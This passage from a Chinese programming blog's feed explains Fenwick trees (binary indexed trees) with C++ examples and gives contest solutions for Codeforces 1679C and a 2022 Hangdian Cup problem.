-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释说明了 <code>lowbit</code> 的意思，对于 $x=88$：$88_{(10)}=1011000_{(2)}$<br>发现第一个 $1$ 以及他后面的 $0$ 组成的二进制是 $1000$<br> $1000_{(2)} = 8_{(10)}$<br>$1000$ 对应的十进制是 $8$，所以 $c_{88}$ 一共管理 $8$ 个 $a$ 数组中的元素。</p><p>在常见的计算机中，有符号数采用补码表示。在补码表示下，数 <code>x</code> 的相反数 <code>-x = ~x + 1</code>。</p><p>使用 lowbit 函数，我们可以实现很多操作，例如单点修改，将 $a_x$ 加上 $k$，只需要更新 $a_x$ 的所有上级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (x &lt;= n) &#123;  <span class="comment">// 不能越界</span></span><br><span class="line">    c[x] = c[x] + k;</span><br><span class="line">    x = x + <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前缀求和：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">// a[1]..a[x]的和</span></span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (x &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    ans = ans + c[x];</span><br><span class="line">    x = x - <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加-amp-区间求和"><a href="#区间加-amp-区间求和" class="headerlink" title="区间加 &amp; 区间求和"></a>区间加 &amp; 区间求和</h2><p>若维护序列 $a$ 的差分数组 $b$，此时我们对 $a$ 的一个前缀 $r$ 求和，即 $\sum_{i=1}^{r} a_i$，由差分数组定义得 $a_i=\sum_{j=1}^i b_j$</p><p>进行推导</p><p>$$<br>\begin{aligned}<br>&amp;\sum_{i=1}^{r} a_i\=&amp;\sum_{i=1}^r\sum_{j=1}^i b_j\=&amp;\sum_{i=1}^r b_i\times(r-i+1)<br>\=&amp;\sum_{i=1}^r b_i\times (r+1)-\sum_{i=1}^r b_i\times i<br>\end{aligned}<br>$$</p><p>区间和可以用两个前缀和相减得到，因此只需要用两个树状数组分别维护 $\sum b_i$ 和 $\sum i \times b_i$，就能实现区间求和。</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.svg"></p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="keyword">int</span> t1[MAXN], t2[MAXN], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x &amp; (-x); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1 = k * v;</span><br><span class="line">  <span class="keyword">while</span> (k &lt;= n) &#123;</span><br><span class="line">    t1[k] += v, t2[k] += v1;</span><br><span class="line">    k += <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> *t, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (k) &#123;</span><br><span class="line">    ret += t[k];</span><br><span class="line">    k -= <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">add</span>(l, v), <span class="built_in">add</span>(r + <span class="number">1</span>, -v);  <span class="comment">// 将区间加差分为两个前缀加</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">getsum1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (r + <span class="number">1ll</span>) * <span class="built_in">getsum</span>(t1, r) - <span class="number">1ll</span> * l * <span class="built_in">getsum</span>(t1, l - <span class="number">1</span>) -</span><br><span class="line">         (<span class="built_in">getsum</span>(t2, r) - <span class="built_in">getsum</span>(t2, l - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><p>$O(n)$ 建树：</p><p>每一个节点的值是由所有与自己直接相连的儿子的值求和得到的。因此可以倒着考虑贡献，即每次确定完儿子的值后，用自己的值更新自己的直接父亲。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="comment">// O(n)建树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">    t[i] += a[i];</span><br><span class="line">    <span class="keyword">int</span> j = i + <span class="built_in">lowbit</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (j &lt;= n) t[j] += t[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加法-amp-单点查询"><a href="#区间加法-amp-单点查询" class="headerlink" title="区间加法&amp;单点查询"></a>区间加法&amp;单点查询</h2><p>只要把我们原来维护的数组进行差分即可。这样的话我们原来 <code>get_sum(x)</code> 的操作就会变成查询 <code>x</code> 点的值 ，因为我们维护的是差分数组，所以在区间加法的时候我们只需要对端点修改即可，复杂度都是 $O(log_2n)$。</p><p>以上大部分内容来自 OI WIKI。</p><h2 id="例题：CF1679C"><a href="#例题：CF1679C" class="headerlink" title="例题：CF1679C"></a>例题：<a href="https://codeforces.com/problemset/problem/1679/C">CF1679C</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题面比较长，但是出的确实比较好。大概就是说给你一张 $n \times n$ 的棋盘，然后给你 3 种类型的操作。</p><ol><li>在 $(x,y)$ 中放入一辆车，保证原位置没车</li><li>在 $(x,y)$ 中取出一辆车 ，保证原位置有车</li><li>选取一块矩形，由左上角端点坐标和右下角端点坐标描述。让你判断这个矩形区域内是否都在车的攻击范围内。</li></ol><p>那么你在没有看到 $n\times n$ 有范围限制就应该能想到了，这题肯定不能存储棋盘，而要描述车的位置。1，2操作我们可以堪称是单点修改，3操作可以看成是区间查询。那么想到这两点就能很好的想到树状数组了。我们把棋盘横竖分离，横坐标建一棵树状数组，纵坐标也建一棵树状数组，那么在插入 $(x,y)$ 的时候我们就可以对横坐标的 $x$ 位置进行单点修改，纵坐标的 $y$ 进行单点修改。其实哪种叫法无所谓，你只要对应上就可以了，不必纠结横纵坐标。那么再仔细解读一下它的第三个要求，判断是否能被车都撞到，那我们很容易想到，横坐标范围都有车或者纵坐标范围都有车，那这个区域都能被车撞到，就可以了，这个区间查询我们查横纵坐标，有一方满足即可。但是需要注意，我们要做一点修改，因为假如一行上面有两辆车，而上一行恰好没有车，那么这两行显然上面那一行不能被撞到，但是因为这两行区间查询得到 $2$ 我们可能误认为它能撞到这两行，那么这显然不符合逻辑。于是我们可以另外开一个数组记录这一行（列）上面车的数量，给树状数组增加的时候我只用保证这一行（列）之前没有车就行了，同样给树状数组减少的时候我们要确保这一行（列）都没车了，才能减少。这样我们就能愉快地 AC 这题了。</p><p>这个题目出的是真的好！</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> c[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> val,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,x,val);</span></span><br><span class="line">        c[x]+=val;</span><br><span class="line">        x+=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> cnt1[maxn],cnt2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> t,x,y,x1,y1;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]++;</span><br><span class="line">            cnt2[y]++;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[x]==<span class="number">1</span>)<span class="built_in">add</span>(x,<span class="number">1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(cnt2[y]==<span class="number">1</span>)<span class="built_in">add</span>(y,<span class="number">1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]--;</span><br><span class="line">            cnt2[y]--;</span><br><span class="line">            <span class="keyword">if</span>(!cnt1[x])<span class="built_in">add</span>(x,<span class="number">-1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(!cnt2[y])<span class="built_in">add</span>(y,<span class="number">-1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;x1,&amp;y1);</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">get_sum</span>(x1,c)-<span class="built_in">get_sum</span>(x<span class="number">-1</span>,c))==(x1-x+<span class="number">1</span>)||(<span class="built_in">get_sum</span>(y1,d)-<span class="built_in">get_sum</span>(y<span class="number">-1</span>,d))==(y1-y+<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>树状数组很后悔没有很早学起来，因为它真的比线段树简单太多了，可惜我是先会的线段树，所以导致就没兴趣学树状数组，不过没事，现在会了也是不迟的！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;树状数组（Fenwick Tree），这次EC Final遇到过的，英文也记一下，也来学一下，刚好半夜刷题刷到了树状数组可以解决的题目！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数据结构" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树状数组" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
    
  </entry>
  
  <entry>
    <title>2022“杭电杯”中国大学生算法设计超级联赛（4）题解</title>
    <link href="http://example.com/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-28T11:00:00.000Z</published>
    <updated>2022-07-28T16:46:48.696Z</updated>
    
    <content type="html"><![CDATA[<p>本场比赛写出一个 <code>1007</code> 也写一篇题解吧！</p><span id="more"></span><!--不知道她是否能答应，再等等吧！--><h2 id="1007"><a href="#1007" class="headerlink" title="1007"></a>1007</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是给你 $n$ 层楼，每层楼有一个怪物，杀了怪物需要自己的攻击力超过它的血量，否则不能到达该楼层，一次可以跳 $k$ 以内的层或者下降一层，杀了怪物后这一层不能继续呆了，杀了怪物之后怪物的血量会成为自己的攻击力。</p><p>看标程是线段树写的，咱也不会，只能纯模拟啦。</p><p>首先可以肯定的一点就是：你跳了之后要把下面的怪物都收拾完，因为题目问你的是：能否解决所有怪物！！而你一次只能下降一层，不能去已经没有怪物的楼层。因此我们主要关注，我们要跳到哪里去，能收拾完下面的怪物。首先可以肯定的是：直接选择能跳的跳是肯定不行的，随便出一组数据便可知。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6 1 5</span><br><span class="line">6 1 1 2 1 4</span><br></pre></td></tr></table></figure><p>当你贪心地跳到第 $2$ 层之后你就会发现 $6$ 你收拾不了了。而这个数据是有解的，我们跳到第五层从上往下收拾完是能打过 $6$ 的。</p><p>那么其实我们就需要判断：我们跳了一个楼层之后是否能收拾下面的怪物，收拾下面的怪物是从上往下收拾，我们还可以沿途吃掉中间的怪物增长攻击力，但是这样的 <code>check</code> 乍一听好像是 <code>O(n)</code> 啊，不可行！但是其实我们可以把打不过的怪物堆起来，打得过的怪物直接扔掉，如果这次选择这层楼打不掉，那么我们选择更高的楼层去打。这样在整体的判断中，每个怪物只会被判一次，总时间复杂度能接受。</p><p>具体实现方式我们可以用栈，首先如果当前楼层我能打过我肯定直接打了，因为上一层比不上一层打肯定要好的，上了一层我还能多一个选择。那么如果当前打不过，我们就先压栈，循环k以内的数据，如果能打过，尝试过来打，并开始从栈中取出怪物来看看能否打过，能打过扔出来，打不过则继续往上走。那么不难发现，我们如果跳到了 $p$ 层，要判断能否结局 $p-i$ 层的怪物我们只需要把当前攻击力加上 $p-i+1——p$ 的怪物数值之和能否超过它的血量即可。那么这里算到和的话我们就可以前缀处理了。那么为什么不需要重复判断呢？因为我跳到这一层时，我都能打过这个怪物了，我跳到更高的层来打这个怪物会打不过？</p><p>如果说 $k$ 层遍历完了之后，我栈里面还有数据，说明我跳哪都打不完这些怪物，就放弃了。如果能跳 $p$ 层打过，我当前在 $q$ 层的话，那么我在解决完之后我身处 $q+1$ 层，中间 $q+1——p$ 层都是空楼层，都不能去，因此我们把自己放到 $p$ 层，但是同时可选择的范围要随着之前跳的高度减少。因为我原来在 $q+1$ 层本来也就只能跳到 $q+k$ 层嘛，这个应该很好理解。</p><p>那么看完这些之后，相信你不难理解下面的标程了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],pre[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line">    <span class="keyword">int</span> sum=m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,a+i);</span><br><span class="line">        sum+=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        pre[i]=pre[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">    stack&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,m);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(m&lt;a[i])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=<span class="built_in">min</span>(n,i+k-len);j++)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(m&gt;=a[j])&#123;</span><br><span class="line">                    <span class="keyword">while</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">                        <span class="keyword">auto</span> top=s.<span class="built_in">top</span>();</span><br><span class="line">                        <span class="keyword">if</span>(m+pre[j]-pre[top.second]&gt;=a[top.second])&#123;</span><br><span class="line">                            s.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        m+=pre[j]-pre[i<span class="number">-1</span>];</span><br><span class="line">                        len=j-i+<span class="number">1</span>;</span><br><span class="line">                        i=j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    s.<span class="built_in">push</span>(&#123;a[j],j&#125;);</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            m+=a[i];</span><br><span class="line">            len=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(m!=sum)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本场比赛写出一个 &lt;code&gt;1007&lt;/code&gt; 也写一篇题解吧！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="杭电杯" scheme="http://example.com/categories/icpc/%E6%9D%AD%E7%94%B5%E6%9D%AF/"/>
    
